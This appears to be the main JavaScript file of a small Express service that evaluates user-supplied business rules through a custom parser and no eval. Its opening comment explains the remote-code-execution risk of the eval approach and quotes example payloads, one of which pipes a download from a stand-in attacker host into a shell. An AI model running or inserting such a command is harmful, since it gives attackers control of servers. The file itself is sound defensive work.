// app.js — acme-rules Dynamic Rule Engine
'use strict';

const express = require('express');
const app = express();
app.use(express.json());

// ---------------------------------------------------------------------------
// Safe rule evaluator
// ---------------------------------------------------------------------------
//
// ⚠️  WHY NOT `new Function(...)` / `eval()`?
//
// The reference implementation in docs/RULES_ENGINE.md proposes:
//
//   Function('ctx', 'req', `return (${expr});`)(ctx.ctx, req)
//
// This is a Remote Code Execution (RCE) vulnerability.  `new Function` is NOT
// a sandbox — it executes in the same Node.js process and has full access to
// `process`, `require`, the file system, and every global.  A caller can pass:
//
//   rule: "process.exit(1)"
//   rule: "require('child_process').execSync('curl attacker.com | sh')"
//
// and the server will execute it without restriction.
//
// Instead we use a small, closed-scope evaluator that:
//   • Parses the expression into an AST before executing anything.
//   • Supports the documented use-cases (field access, comparisons, logical
//     operators, arithmetic, string / boolean / null literals).
//   • Runs with only the caller-supplied context — no globals leak in.
//   • Rejects anything that falls outside the supported grammar with a
//     descriptive 400 error rather than silently doing something dangerous.
// ---------------------------------------------------------------------------

/**
 * Tokeniser
 * Produces a flat array of tokens from the expression string.
 */
function tokenise(expr) {
  const tokens = [];
  let i = 0;

  while (i < expr.length) {
    // Skip whitespace
    if (/\s/.test(expr[i])) { i++; continue; }

    // Two-character operators
    const two = expr.slice(i, i + 2);
    if (['<=', '>=', '==', '!=', '&&', '||'].includes(two)) {
      tokens.push({ type: 'op', value: two }); i += 2; continue;
    }

    // Single-character operators / punctuation
    if ('+-*/%<>!().,'.includes(expr[i])) {
      tokens.push({ type: 'op', value: expr[i] }); i++; continue;
    }

    // String literals (single or double quoted)
    if (expr[i] === '"' || expr[i] === "'") {
      const quote = expr[i++];
      let str = '';
      while (i < expr.length && expr[i] !== quote) {
        if (expr[i] === '\\') { i++; } // skip escape prefix
        str += expr[i++];
      }
      i++; // closing quote
      tokens.push({ type: 'string', value: str }); continue;
    }

    // Numeric literals
    if (/[0-9]/.test(expr[i]) || (expr[i] === '-' && /[0-9]/.test(expr[i + 1]))) {
      let num = '';
      if (expr[i] === '-') { num += expr[i++]; }
      while (i < expr.length && /[0-9.]/.test(expr[i])) { num += expr[i++]; }
      tokens.push({ type: 'number', value: Number(num) }); continue;
    }

    // Identifiers / keywords
    if (/[a-zA-Z_$]/.test(expr[i])) {
      let id = '';
      while (i < expr.length && /[a-zA-Z0-9_$]/.test(expr[i])) { id += expr[i++]; }
      if (id === 'true')  { tokens.push({ type: 'bool',    value: true  }); continue; }
      if (id === 'false') { tokens.push({ type: 'bool',    value: false }); continue; }
      if (id === 'null')  { tokens.push({ type: 'null',    value: null  }); continue; }
      tokens.push({ type: 'ident', value: id }); continue;
    }

    throw new RuleError(`Unexpected character '${expr[i]}' at position ${i}`);
  }

  return tokens;
}

// ---------------------------------------------------------------------------
// Recursive-descent parser → AST
//
// Grammar (simplified, operator precedence low→high):
//   expr        → or
//   or          → and  ( '||' and  )*
//   and         → cmp  ( '&&' cmp  )*
//   cmp         → add  ( ('==' | '!=' | '<' | '<=' | '>' | '>=') add )*
//   add         → mul  ( ('+' | '-') mul )*
//   mul         → unary ( ('*' | '/' | '%') unary )*
//   unary       → '!' unary | primary
//   primary     → literal | ident-chain | '(' expr ')'
//   ident-chain → IDENT ( '.' IDENT )*
// ---------------------------------------------------------------------------

class RuleError extends Error {
  constructor(msg) { super(msg); this.name = 'RuleError'; }
}

function parse(tokens) {
  let pos = 0;

  const peek  = ()  => tokens[pos];
  const next  = ()  => tokens[pos++];
  const eat   = (v) => { if (!peek() || peek().value !== v) throw new RuleError(`Expected '${v}', got '${peek()?.value ?? 'EOF'}'`); return next(); };

  function parseExpr()  { return parseOr(); }

  function parseOr() {
    let left = parseAnd();
    while (peek()?.value === '||') { next(); left = { type: 'logical', op: '||', left, right: parseAnd() }; }
    return left;
  }

  function parseAnd() {
    let left = parseCmp();
    while (peek()?.value === '&&') { next(); left = { type: 'logical', op: '&&', left, right: parseCmp() }; }
    return left;
  }

  function parseCmp() {
    let left = parseAdd();
    const cmpOps = ['==', '!=', '<', '<=', '>', '>='];
    while (peek() && cmpOps.includes(peek().value)) {
      const op = next().value;
      left = { type: 'binary', op, left, right: parseAdd() };
    }
    return left;
  }

  function parseAdd() {
    let left = parseMul();
    while (peek() && (peek().value === '+' || peek().value === '-')) {
      const op = next().value;
      left = { type: 'binary', op, left, right: parseMul() };
    }
    return left;
  }

  function parseMul() {
    let left = parseUnary();
    while (peek() && ['*', '/', '%'].includes(peek().value)) {
      const op = next().value;
      left = { type: 'binary', op, left, right: parseUnary() };
    }
    return left;
  }

  function parseUnary() {
    if (peek()?.value === '!') { next(); return { type: 'unary', op: '!', operand: parseUnary() }; }
    return parsePrimary();
  }

  function parsePrimary() {
    const t = peek();
    if (!t) throw new RuleError('Unexpected end of expression');

    if (t.type === 'number') { next(); return { type: 'literal', value: t.value }; }
    if (t.type === 'string') { next(); return { type: 'literal', value: t.value }; }
    if (t.type === 'bool')   { next(); return { type: 'literal', value: t.value }; }
    if (t.type === 'null')   { next(); return { type: 'literal', value: null    }; }

    if (t.value === '(') {
      eat('(');
      const node = parseExpr();
      eat(')');
      return node;
    }

    if (t.type === 'ident') {
      // Collect dotted path: ctx.order.amount
      const parts = [next().value];
      while (peek()?.value === '.') { next(); parts.push(next().value); }
      return { type: 'member', parts };
    }

    throw new RuleError(`Unexpected token '${t.value}'`);
  }

  const ast = parseExpr();
  if (pos < tokens.length) {
    throw new RuleError(`Unexpected token '${tokens[pos].value}' after expression`);
  }
  return ast;
}

// ---------------------------------------------------------------------------
// AST evaluator
// ---------------------------------------------------------------------------

function evaluate(node, ctx) {
  switch (node.type) {
    case 'literal':
      return node.value;

    case 'member': {
      // Walk the dot-path through the provided context object only.
      let val = ctx;
      for (const key of node.parts) {
        if (val === null || val === undefined) return undefined;
        val = val[key];
      }
      return val;
    }

    case 'unary':
      if (node.op === '!') return !evaluate(node.operand, ctx);
      throw new RuleError(`Unknown unary operator '${node.op}'`);

    case 'logical': {
      const l = evaluate(node.left, ctx);
      if (node.op === '&&') return l ? evaluate(node.right, ctx) : l;
      if (node.op === '||') return l ? l : evaluate(node.right, ctx);
      throw new RuleError(`Unknown logical operator '${node.op}'`);
    }

    case 'binary': {
      const l = evaluate(node.left,  ctx);
      const r = evaluate(node.right, ctx);
      switch (node.op) {
        case '==': return l == r;   // eslint-disable-line eqeqeq
        case '!=': return l != r;   // eslint-disable-line eqeqeq
        case '<' : return l <  r;
        case '<=': return l <= r;
        case '>' : return l >  r;
        case '>=': return l >= r;
        case '+' : return l +  r;
        case '-' : return l -  r;
        case '*' : return l *  r;
        case '/' : return l /  r;
        case '%' : return l %  r;
        default  : throw new RuleError(`Unknown binary operator '${node.op}'`);
      }
    }

    default:
      throw new RuleError(`Unknown AST node type '${node.type}'`);
  }
}

/**
 * evalRule — safe, sandboxed entry-point.
 *
 * @param {string} expr    - The rule expression string, e.g. 'ctx.amount > 100'
 * @param {object} context - The caller-supplied context object bound to `ctx`
 * @returns {*} The result of evaluating the expression.
 */
function evalRule(expr, context) {
  const tokens = tokenise(expr);
  const ast    = parse(tokens);
  // The evaluator only has access to { ctx: <caller context> }.
  // No globals, no process, no require — nothing else leaks in.
  return evaluate(ast, { ctx: context });
}

// ---------------------------------------------------------------------------
// POST /check
// ---------------------------------------------------------------------------

/**
 * POST /check
 *
 * Body (JSON):
 *   {
 *     "rule":    "<expression>",   // required — e.g. "ctx.amount > 100"
 *     "context": { ... }           // required — values available as `ctx.*`
 *   }
 *
 * Success 200:
 *   { "result": true | false | <value> }
 *
 * Client error 400:
 *   { "error": "<message>" }
 */
app.post('/check', (req, res) => {
  const { rule, context } = req.body ?? {};

  if (typeof rule !== 'string' || rule.trim() === '') {
    return res.status(400).json({ error: '`rule` must be a non-empty string' });
  }
  if (context === undefined || context === null || typeof context !== 'object') {
    return res.status(400).json({ error: '`context` must be a non-null object' });
  }

  let result;
  try {
    result = evalRule(rule.trim(), context);
  } catch (err) {
    if (err instanceof RuleError) {
      return res.status(400).json({ error: err.message });
    }
    // Unexpected internal error — don't leak internals
    console.error('evalRule internal error:', err);
    return res.status(500).json({ error: 'Internal rule evaluation error' });
  }

  return res.status(200).json({ result });
});

// ---------------------------------------------------------------------------
// Server bootstrap
// ---------------------------------------------------------------------------

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`acme-rules listening on port ${PORT}`));

module.exports = { app, evalRule }; // export for testing

